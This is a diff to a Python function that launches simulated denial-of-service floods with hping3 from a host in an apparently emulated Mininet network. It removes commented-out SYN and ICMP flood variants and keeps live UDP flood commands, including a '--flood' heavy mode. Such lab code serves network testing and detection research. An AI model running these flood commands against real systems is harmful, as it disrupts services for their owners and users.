@@ -131,18 +131,6 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
             f"bash -lc 'hping3 --udp -q -p {target_port} -d 128 -i u200 {target_ip} >> {host_log_q} 2>&1 &'"
         )
 
-        # SYN
-        #h5.cmd(f"echo '[DOS][LIGHT][SYN] start pps~500 duration=45s' >> {host_log_q}")
-        #h5.cmd(
-            #f"bash -lc 'timeout 45s hping3 -S -q -p {target_port} -d 64 -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
-        #)
-
-        # ICMP
-        #h5.cmd(f"echo '[DOS][LIGHT][ICMP] start pps~1000 duration=45s' >> {host_log_q}")
-        #h5.cmd(
-            #f"bash -lc 'timeout 45s hping3 --icmp -q -i u300 {target_ip} >> {host_log_q} 2>&1 &'"
-        #)
-
     elif mode == "heavy":
         print("Running HEAVY DoS (controlled high-rate attack)")
         h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> {host_log_q}")
@@ -152,18 +140,6 @@ def run_dos_attack(net, mode="light", host_log_dir=None):
         h5.cmd(
             f"bash -lc 'hping3 --udp --flood -p {target_port} -d 128 {target_ip} >> {host_log_q} 2>&1 &'"
         )
-
-        # SYN heavy
-        #h5.cmd(f"echo '[DOS][HEAVY][SYN] start pps~3000 duration=60s' >> {host_log_q}")
-        #h5.cmd(
-            #f"bash -lc 'timeout 60s hping3 -S -q -p {target_port} -d 64 -i u30 {target_ip} >> {host_log_q} 2>&1 &'"
-        #)
-
-        # ICMP heavy
-        #h5.cmd(f"echo '[DOS][HEAVY][ICMP] start pps~5000 duration=60s' >> {host_log_q}")
-        #h5.cmd(
-            #f"bash -lc 'timeout 60s hping3 --icmp -q -i u30 {target_ip} >> {host_log_q} 2>&1 &'"
-        #)
 
 
 if __name__ == "__main__":
